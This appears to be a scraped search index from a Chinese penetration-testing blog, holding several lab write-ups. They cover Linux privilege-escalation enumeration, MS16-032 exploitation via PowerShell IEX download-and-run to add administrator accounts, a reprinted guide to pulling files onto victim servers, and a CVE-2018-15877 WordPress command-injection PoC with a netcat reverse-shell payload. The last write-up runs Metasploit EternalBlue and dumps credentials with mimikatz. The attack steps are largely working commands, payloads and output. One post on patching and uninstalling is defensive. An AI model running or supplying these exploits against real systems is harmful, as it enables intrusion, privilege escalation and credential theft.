#从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息 寻找可写目录 find / -writable -type d 2&gt;/dev/null # 可写目录 find / -perm -222 -type d 2&gt;/dev/null # 可写目录 find / -perm -o w -type d 2&gt;/dev/null # 可写目录 find / -perm -o x -type d 2&gt;/dev/null # 可执行目录 find / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null # 可写可执行 目录 查找文件 find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print 2&gt;/dev/null # 可写文件 find / dir -xdev \\( -nouser -o -nogroup \\) -print 2&gt;/dev/null # 无所有者文件 0x05 准备及攻击查看语言支持 find / -name perl* find / -name python* find / -name gcc* find / -name cc 查看上传方式 find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp 寻找exphttp://www.exploit-db.comhttp://1337day.comhttp://www.securiteam.comhttp://www.securityfocus.comhttp://www.exploitsearch.nethttp://metasploit.com/modules/http://securityreason.comhttp://seclists.org/fulldisclosure/http://www.google.com 编译exp which gcc gcc exp.c -o exp 运行 chmod +x exp ./exp 0x06 提权辅助脚本LinEnum linuxprivchecker.py 以上并不全，可能会有什么错误，请各位大大指正或补充。多多学习交流。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"MS16-032（CVE-2016-0099）复现","slug":"MS16-032（CVE-2016-0099）复现","date":"2019-10-03T16:00:00.000Z","updated":"2019-10-17T11:58:43.656Z","comments":true,"path":"2019/10/04/MS16-032（CVE-2016-0099）复现/","link":"","permalink":"https://knlvre.github.io/2019/10/04/MS16-032（CVE-2016-0099）复现/","excerpt":"","text":"漏洞漏洞类型：特权提升 Microsoft 安全公告：https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032 exploit-db的详情：https://www.exploit-db.com/exploits/39574/ 利用时需要满足的要求 ①系统需要拥有至少2个的CPU核心 ②Power shell v2.0以及更高的版本 影响的Windwos版本 Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows 8.1、Windows 10 本次复现的版本为Windows 7，其他的没有再去复现 环境虚拟机平台：VMware Workstation Pro 测试机：Windows 7 渗透测试测试一：普通用户登录下，获取管理员cmd 脚本地址：1_Invoke-MS16-032.ps1 创建文件的方法有多种，这里演示两种： ①创建文件1_Invoke-MS16-032.ps1并写入内容； E:\\MS16-032&gt;type nul &gt; 1_Invoke-MS16-032.ps1 E:\\MS16-032&gt;notepad 1_Invoke-MS16-032.ps1 #写入内容 ②用之前提到的powershell脚本直接下载文件 Ps：可以参考我之前转载的文章：十三种方式下载文件 E:\\MS16-032&gt;type nul &gt; download.ps1 E:\\MS16-032&gt;notepad download.ps1 E:\\MS16-032&gt;type download.ps1 $p = New-Object System.Net.WebClient $p.DownloadFile(&quot;https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1&quot;,&quot;E:\\MS16-032\\1_Invoke-MS16-032.ps1&quot;) E:\\MS16-032&gt;dir 2019/10/04 03:08 &lt;DIR&gt; . 2019/10/04 03:08 &lt;DIR&gt; .. 2019/10/04 03:08 184 download.ps1 E:\\MS16-032&gt;powershell -exec bypass Windows PowerShell 版权所有 (C) 2009 Microsoft Corporation。保留所有权利。 PS E:\\MS16-032&gt; . .\\download.ps1 PS E:\\MS16-032&gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a--- 2019/10/4 3:08 11460 1_Invoke-MS16-032.ps1 -a--- 2019/10/4 3:08 184 download.ps1 文件下载好之后，先展示一下当前用户，以及属组 E:\\MS16-032&gt;whoami win...\\test E:\\MS16-032&gt;net user test 用户名 test ... 可允许的登录小时数 All 本地组成员 *Users 全局组成员 *None 命令成功完成。 无权的一个用户，现在开始执行脚本 E:\\MS16-032&gt;powershell -exec bypass Windows PowerShell 版权所有 (C) 2009 Microsoft Corporation。保留所有权利。 PS E:\\MS16-032&gt; . .\\1_Invoke-MS16-032.ps1 PS E:\\MS16-032&gt; Invoke-MS16-032 __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -&gt; @FuzzySec] [?] Operating system core count: 2 [&gt;] Duplicating CreateProcessWithLogonW handle ... [&gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! PS E:\\MS16-032&gt; 执行完之后，直接拿到管理员的cmd 前面的步骤时进入powershell在执行命令，但其实可以加一个-c参数，后面可以直接接命令，分号分隔开，然后就会自动执行，不用进入powershell。当然，这是根据个人喜好，进入powershell之后还有tab自动补全等功能 E:\\MS16-032&gt;powershell -exec bypass -c &quot;. .\\1_Invoke-MS16-032.ps1;Invoke-MS16-032&quot; __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -&gt; @FuzzySec] [?] Operating system core count: 2 [&gt;] Duplicating CreateProcessWithLogonW handle ... [&gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! E:\\MS16-032&gt; 测试二：普通用户登录下，创建其他用户，并加入administrators组 脚本地址：2_Invoke-MS16-032.ps1 Ps：相对于测试一的脚本，该脚本进行了简单改变，可以执行任意程序，并可以添加参数执行（全程无弹框）。-Application参数可以执行任意程序 先看一下权限 E:\\MS16-032&gt;whoami win...\\test E:\\MS16-032&gt;net user test_test /add 发生系统错误 5。 拒绝访问。 在这里又学了一招，不用下载文件，直接远程利用脚本，不用下载到本地（当然也可以像之前那样）。现在开始执行脚本，直接试一下添加用户： E:\\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user test_test test_test /add&#39;&quot; __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -&gt; @FuzzySec] [?] Operating system core count: 2 [&gt;] Duplicating CreateProcessWithLogonW handles.. ... [&gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! E:\\MS16-032&gt;net user --------------------------------------------------------------------- Administrator Guest HSW test test_test 命令成功完成。 E:\\MS16-032&gt;net user test_test 用户名 test_test ... 本地组成员 *Users 全局组成员 *None 命令成功完成。 可以看到test_test用户添加完成，但是只属于Users组，现在将其加入Administrators组，先查看一下组和权限 E:\\MS16-032&gt;net localgroup Administrators 别名 Administrators 注释 管理员对计算机/域有不受限制的完全访问权 成员 ---------------------------------------------- Administrator 命令成功完成。 E:\\MS16-032&gt;net localgroup Administrators test_test /add 发生系统错误 5。 拒绝访问。 然后执行脚本并验证 E:\\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net localgroup Administrators test_test /add&#39;&quot; __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -&gt; @FuzzySec] [?] Operating system core count: 2 [&gt;] Duplicating CreateProcessWithLogonW handles.. ... [&gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! E:\\MS16-032&gt;net localgroup Administrators 别名 Administrators 注释 管理员对计算机/域有不受限制的完全访问权 成员 --------------------------------------------- Administrator test_test 命令成功完成。 E:\\MS16-032&gt;net user test_test 用户名 test_test ... 本地组成员 *Administrators *Users 全局组成员 *None 命令成功完成。 参考文章 https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"Windows系统添加补丁","slug":"Windows系统添加补丁","date":"2019-10-03T16:00:00.000Z","updated":"2019-10-04T04:13:53.660Z","comments":true,"path":"2019/10/04/Windows系统添加补丁/","link":"","permalink":"https://knlvre.github.io/2019/10/04/Windows系统添加补丁/","excerpt":"","text":"# 补丁下载各种各样的漏洞需要与其对应的补丁去修复，漏洞的详情和补丁的下载可以直接到Microsoft的官网去查看和下载：https://docs.microsoft.com/zh-cn/security-updates/ 点击左边栏的Security Bulletins可以查找想要看的漏洞 这里以打MS16-032（CVE-2016-0099）的补丁为例：左边栏找到MS16-032，找到系统对应版本 在跳转页面后，点击Download，下载 补丁安装Windows系统自带补丁安装程序：wusa。命令行执行wusa.exe可以弹出使用帮助 命令行安装补丁（要制定完整的文件地址，不能是相对地址） E:\\MS16-032&gt;wusa E:\\MS16-032\\Windows6.1-KB3139914-x64.msu E:\\MS16-032&gt; 补丁安装完成需要重启计算机才能生效。重启完之后，看一下补丁的安装情况。可以看到KB3139914已经安装了 E:\\MS16-032&gt;systeminfo ... 系统类型: x64-based PC 处理器: 安装了 2 个处理器。 修补程序: 安装了 5 个修补程序。 [01]: KB2534111 [02]: KB2999226 [03]: KB3139914 [04]: KB958488 [05]: KB976902 ... E:\\MS16-032&gt; 当前系统存在的用户 E:\\MS16-032&gt;net user \\\\WIN... 的用户帐户 --------------------------------------------------------- Administrator Guest HSW 命令成功完成。 执行MS16-032（CVE-2016-0099）的脚本，可以参考之前这篇文章： E:\\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user test_test test_test /add&#39;&quot; __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -&gt; @FuzzySec] [?] Operating system core count: 2 [&gt;] Duplicating CreateProcessWithLogonW handles.. [!] No valid thread handles were captured, exiting! E:\\MS16-032&gt; 从结果可以看出，已经无法成功执行，说明我们打的补丁已经生效了 补丁卸载命令行 E:\\MS16-032&gt;wusa /uninstall /kb:3139914 卸载完成之后需要重启。重启后我们再次查看补丁列表，已经没有了KB3139914 E:\\MS16-032&gt;systeminfo ... 系统类型: x64-based PC 处理器: 安装了 2 个处理器。 修补程序: 安装了 5 个修补程序。 [01]: KB2534111 [02]: KB2999226 [03]: KB958488 [04]: KB976902 ... E:\\MS16-032&gt; 试一下执行MS16-032（CVE-2016-0099）的脚本 E:\\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user test_test test_test /add&#39;&quot; __ __ ___ ___ ___ ___ ___ ___ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -&gt; @FuzzySec] [?] Operating system core count: 2 [&gt;] Duplicating CreateProcessWithLogonW handles.. ... [&gt;] Starting process race [!] Holy handle leak Batman, we have a SYSTEM shell!! E:\\MS16-032&gt;net user \\\\WIN... 的用户帐户 ----------------------------------------------------- Administrator Guest HSW test_test 命令成功完成。 E:\\MS16-032&gt; 脚本又能执行成功了，说明我们成功卸载补丁","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"十三种方式下载文件","slug":"十三种方式下载文件","date":"2019-10-03T16:00:00.000Z","updated":"2019-10-13T07:17:24.040Z","comments":true,"path":"2019/10/04/十三种方式下载文件/","link":"","permalink":"https://knlvre.github.io/2019/10/04/十三种方式下载文件/","excerpt":"","text":"本文转载自原文：13种方式下载文件 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。 0x01 Powershell创建如下PSH脚本： $p = New-Object System.Net.WebClient $p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;) 如：$p.DownloadFile(&quot;http://192.168.0.111:3737/test.txt&quot;,&quot;E:text_download.txt&quot;) 注意：下载的路径如果出现中文字的路径，可能会出错 执行： PS C:&gt; .test.ps1 如果Powershell禁止执行了，使用如下命令： C:&gt;powershell set-executionpolicy unrestricted Ps：如果提示无权修改，则切换到Windows\\System32下，管理员身份运行cmd.exe，再执行命令就可以 使用如下命令可以查看当前的executionpolicy E:\\&gt;powershell executionpolicy Restricted 但是，后来发现只要加-exec bypass就可以不收executionpolicy的限制，执行任意脚本 E:\\&gt;powershell -exec bypass Windows PowerShell 版权所有 (C) 2009 Microsoft Corporation。保留所有权利。 PS E:\\&gt; executionpolicy Bypass 0x02 Visual Basic创建如下VBS脚本 Set args = Wscript.Arguments Url = &quot;http://domain/file&quot; dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;) dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;) xHttp.Open &quot;GET&quot;, Url, False xHttp.Send with bStrm .type = 1 &#39; .open .write xHttp.responseBody .savetofile &quot; C:\\%homepath%\\file&quot;, 2 &#39; end with 执行： C:&gt;cscript test.vbs 0x03 Perl脚本如下: #!/usr/bin/perl use LWP::Simple; getstore(&quot;http://domain/file&quot;, &quot;file&quot;); 执行： root@kali:~# perl test.pl 0x04 Python脚本如下： #!/usr/bin/python import urllib2 u = urllib2.urlopen(&#39;http://domain/file&#39;) localFile = open(&#39;local_file&#39;, &#39;w&#39;) localFile.write(u.read()) localFile.close() 执行： root@kali:~# python test.py 0x05 Ruby脚本如下： #!/usr/bin/ruby require &#39;net/http&#39; Net::HTTP.start(&quot;www.domain.com&quot;) { |http| r = http.get(&quot;/file&quot;) open(&quot;save_location&quot;, &quot;wb&quot;) { |file| file.write(r.body) } } 执行： root@kali:~# ruby test.rb 0x06 PHP脚本如下： #!/usr/bin/php &quot;http://example.com/file&quot;); $lf = &quot;local_file&quot;; $fh = fopen($lf, &#39;w&#39;); fwrite($fh, $data[0]); fclose($fh); ?&gt; 执行： root@kali:~# php test.php 0x07 FTP执行如下命令： ftp 127.0.0.1 username password get file exit 0x08 TFTP执行如下命令： 复制 tftp -i host GET C:%homepath%file location_of_file_on_tftp_server 0x09 Bitsadmin执行如下命令： bitsadmin /transfer n http://domain/file c:%homepath%file 0x10 Wget执行如下命令： wget http://example.com/file 0x11 Netcatattacker执行如下命令： cat file | nc -l 1234 target执行： nc host_ip 1234 &gt; file Netcat补充： 传输文件 方法一： 接收端，先监听 nc -l 3737 &gt; test.txt 传送端，发送 nc [ip] 3737 &lt; test.txt 方法二： 发送端，先监听 nc -l 3737 &lt; test.txt 接收端，连接 nc [ip] 3737 &gt; test.txt 传送目录 传送目录操作与传送文件类似，但不同的是需要先压缩再解压缩，并且管道后面最后必须是 - ，不能是其余自定义的文件名 接收端，先监听并准备解压缩 nc -l 3737 | tar zxvf - 发送端，压缩并发送 tar zxvf - * | nc [ip] 3737 0x12 Window 文件共享使用如下命令: net use x: \\127.0.0.1\\share /user:example.comuserID myPassword 0x13 记事本： 打开记事本 文件，打开 在文件名处填入下载地址","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"CVE-2018-15877 复现","slug":"CVE-2018-15877 复现","date":"2019-09-25T16:00:00.000Z","updated":"2019-10-04T02:08:13.450Z","comments":true,"path":"2019/09/26/CVE-2018-15877 复现/","link":"","permalink":"https://knlvre.github.io/2019/09/26/CVE-2018-15877 复现/","excerpt":"","text":"漏洞漏洞类型：远程命令执行漏洞 WordPress框架当中的Activity monitor插件引起的漏洞 环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.22） 靶机：Debian GNU/Liux 9（IP：192.168.43.84） 渗透测试拿到管理员账号进入后台之后，点击Activity monitor -&gt; Tools，输入参数后点击Lookup提交抓包 修改ip参数，没有任何过滤地命令执行 直接拿shell root@Knlvre:~# nc -lvnp 3737 listening on [any] 3737 ... connect to [192.168.43.84] from (UNKNOWN) [192.168.43.22] 58488 python -c &quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&quot; $ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ 也可以利用searchsploit拿别人写好的POC searchsploit搜索关键词wordpress activity monitor root@Knlvre:/~# searchsploit wordpress activity monitor ------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ------------------------------------------- ---------------------------------------- WordPress Plugin Plainview ... | exploits/php/webapps/45274.html ------------------------------------------- ---------------------------------------- Shellcodes: No Result root@Knlvre:/~# searchsploit -m exploits/php/webapps/45274.html Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection URL: https://www.exploit-db.com/exploits/45274 Path: /usr/share/exploitdb/exploits/php/webapps/45274.html File Type: HTML document, ASCII text, with CRLF line terminators Copied to: /var/www/html/45274.html 查看45274.html root@Knlvre:/~# cat 45274.html &lt;!-- About: =========== Component: Plainview Activity Monitor (Wordpress plugin) Vulnerable version: 20161228 and possibly prior Fixed version: 20180826 CVE-ID: CVE-2018-15877 CWE-ID: CWE-78 Author: - LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre) Timeline: =========== - 2018/08/25: Vulnerability found - 2018/08/25: CVE-ID request - 2018/08/26: Reported to developer - 2018/08/26: Fixed version - 2018/08/26: Advisory published on GitHub - 2018/08/26: Advisory sent to bugtraq mailing list Description: =========== Plainview Activity Monitor Wordpress plugin is vulnerable to OS command injection which allows an attacker to remotely execute commands on underlying system. Application passes unsafe user supplied data to ip parameter into activities_overview.php. Privileges are required in order to exploit this vulnerability, but this plugin version is also vulnerable to CSRF attack and Reflected XSS. Combined, these three vulnerabilities can lead to Remote Command Execution just with an admin click on a malicious link. References: =========== https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/ PoC: --&gt; &lt;html&gt; &lt;!-- Wordpress Plainview Activity Monitor RCE [+] Version: 20161228 and possibly prior [+] Description: Combine OS Commanding and CSRF to get reverse shell [+] Author: LydA(c)ric LEFEBVRE [+] CVE-ID: CVE-2018-15877 [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt; &lt;form action=&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 根据提示，我们修改部分内容： ... &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt; &lt;form action=&quot;http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc -e /bin/bash 192.168.199.133 3737&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; ... 然后现在攻击机这段开启端口监听 root@Knlvre:~# nc -lvnp 3737 listening on [any] 3737 ... 再去访问http://127.0.0.1/45274.html，点击Submit request 返回shell root@Knlvre:~# nc -lvnp 3737 listening on [any] 3737 ... connect to [192.168.199.133] from (UNKNOWN) [192.168.199.107] 53980 python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@dc-6:/var/www/html/wp-admin$ id uid=33(www-data) gid=33(www-data) groups=33(www-data)","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"MS17-010（CVE-2017-0143）& CVE-2017-7494 复现","slug":"MS17-010（CVE-2017-0143）复现","date":"2019-09-23T16:00:00.000Z","updated":"2019-10-19T12:38:54.059Z","comments":true,"path":"2019/09/24/MS17-010（CVE-2017-0143）复现/","link":"","permalink":"https://knlvre.github.io/2019/09/24/MS17-010（CVE-2017-0143）复现/","excerpt":"","text":"环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.199.133） 靶机：Windows 7（IP：192.168.199.229） 靶机：Linux docker（IP：192.168.199.186） 渗透测试本文章复现的两个CVE分别是针对 Windows 和 Linux 445端 （1）MS17-010（CVE-2017-0143）打开MSF msfconsole 查找search ms17-010 msf5 &gt; search ms17-010 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 1 auxiliary/scanner/smb/smb_ms17_010 normal Yes MS17-010 SMB RCE Detection 2 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 3 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 4 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 使用auxiliary/scanner/smb/smb_ms17_010模块，可以检测目标主机是否存在漏洞 Ps：show option后标记为YES的参数需要设置 msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 192.168.199.229 RHOSTS =&gt; 192.168.199.229 msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options Module options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 192.168.199.229 yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit [+] 192.168.199.229:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 192.168.199.229:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 出现如下提示，就是存在MS17-010漏洞 Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) 存在漏洞之后就可以使用exploit/windows/smb/ms17_010_eternalblue模块攻击 msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.199.229 RHOSTS =&gt; 192.168.199.229 msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 192.168.199.133 LHOST =&gt; 192.168.199.133 直接拿到system权限 msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit [*] Started reverse TCP handler on 192.168.199.133:4444 [+] 192.168.199.229:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 192.168.199.229:445 - Connecting to target for exploitation. [+] 192.168.199.229:445 - Connection established for exploitation. [+] 192.168.199.229:445 - Target OS selected valid for OS indicated by SMB reply [*] 192.168.199.229:445 - CORE raw buffer dump (42 bytes) [*] 192.168.199.229:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 192.168.199.229:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 192.168.199.229:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 192.168.199.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 192.168.199.229:445 - Trying exploit with 12 Groom Allocations. [*] 192.168.199.229:445 - Sending all but last fragment of exploit packet [*] 192.168.199.229:445 - Starting non-paged pool grooming [+] 192.168.199.229:445 - Sending SMBv2 buffers [+] 192.168.199.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 192.168.199.229:445 - Sending final SMBv2 buffers. [*] 192.168.199.229:445 - Sending last fragment of exploit packet! [*] 192.168.199.229:445 - Receiving response from exploit packet [+] 192.168.199.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 192.168.199.229:445 - Sending egg to corrupted connection. [*] 192.168.199.229:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (192.168.199.133:4444 -&gt; 192.168.199.229:49869) at 2019-09-24 21:27:28 +0800 [+] 192.168.199.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 192.168.199.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 192.168.199.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= C:\\Windows\\system32&gt;whoami whoami nt authority\\system 增加payload：windows/x64/meterpreter/reverse_tcp可以使用meterpreter，有丰富的命令： 直接打开靶机终端：shell meterpreter &gt; shell Process 3060 created. Channel 2 created. Microsoft Windows [�汾 6.1.7601] C:\\Windows\\system32&gt;whoami whoami nt authority\\system 查看当前权限：getuid meterpreter &gt; getuid Server username: NT AUTHORITY\\SYSTEM 打开摄像头：webcam_snap 当有system权限并且对方有摄像头可以打开摄像头（我的靶机是虚拟机，没有摄像头） meterpreter &gt; webcam_snap [-] Target does not have a webcam 查看系统详情：sysinfo meterpreter &gt; sysinfo Computer : WIN-VN2RCOUKIHC OS : Windows 7 (Build 7601, Service Pack 1). Architecture : x64 System Language : zh_CN Domain : WORKGROUP Logged On Users : 2 Meterpreter : x64/windows 桌面截图：screenshot meterpreter &gt; screenshot Screenshot saved to: /root/qDUEYkWT.jpeg 查看用户的明文密码： load mimikatz #help mimikatz 查看帮助 wdigest #获取Wdigest密码 mimikatz_command -f samdump::hashes #执行mimikatz原始命令 mimikatz_command -f sekurlsa::searchPasswords meterpreter &gt; load mimikatz Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#39;load kiwi&#39; instead? Success. meterpreter &gt; wdigest [+] Running as SYSTEM [*] Retrieving wdigest credentials wdigest credentials =================== AuthID Package Domain User Password ------ ------- ------ ---- -------- 0;997 Negotiate NT AUTHORITY LOCAL SERVICE 0;996 Negotiate WORKGROUP WIN-VN***IHC$ 0;49783 NTLM 0;999 NTLM WORKGROUP WIN-VN***IHC$ 0;403678 NTLM WIN-VN2RCOUKIHC ***（和谐） ***(我直接获取明文密码，和谐掉) 0;403653 NTLM WIN-VN2RCOUKIHC ***（和谐） ***(我直接获取明文密码，和谐掉) meterpreter命令还有很多，就不一一介绍了 （2）CVE-2017-7494首先下载漏洞环境，在docker中运行（由于第一次使用docker环境，所以写得详细一些） 链接：https://pan.baidu.com/s/1QueT0MgKqTK-4Y1pIThHSw 密码：gc29 安装docker-ce sudo apt-get install docker-ce 安装docker-compose（因为docker是python3环境的，所以这里用pip3下载才能兼容使用，pip2下载的无法使用） pip3 install docker-compose 运行docker-compose时却提示docker-compose not found，后来在/home/username/.local/bin/目录下发现可执行文件docker-compose，于是将其添加进当前用户的.bashrc文件， vi /home/[username]/.bashrc #添加语句：alias docker-compose=&quot;/home/knlvre/.local/bin/docker-compose&quot; 保存之后刷新.bashrc source /home/[username]/.bashrc 再次查看alias，就可以看到docker-compose命令了 ┌─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $alias alias docker-compose=&#39;/home/knlvre/.local/bin/docker-compose&#39; 然后切换到刚才网盘下载的文件夹中，运行docker-compose命令却报错，如下 ERROR: Couldn&#39;t connect to Docker daemon at http+docker://localunixsocket - is it running? 查看docker的运行状态，却提示正在运行 ┌─[✗]─[knlvre@knlvre-PC]─[~/Desktop/CVE-2017-7494] └──╼ $/etc/init.d/docker status ● docker.service - Docker Application Container Engine Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled) Active: active (running) since Thu 2019-10-17 19:59:46 CST; 19min ago Docs: https://docs.docker.com Main PID: 23857 (dockerd) Tasks: 12 Memory: 317.1M CPU: 38.808s CGroup: /system.slice/docker.service └─23857 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 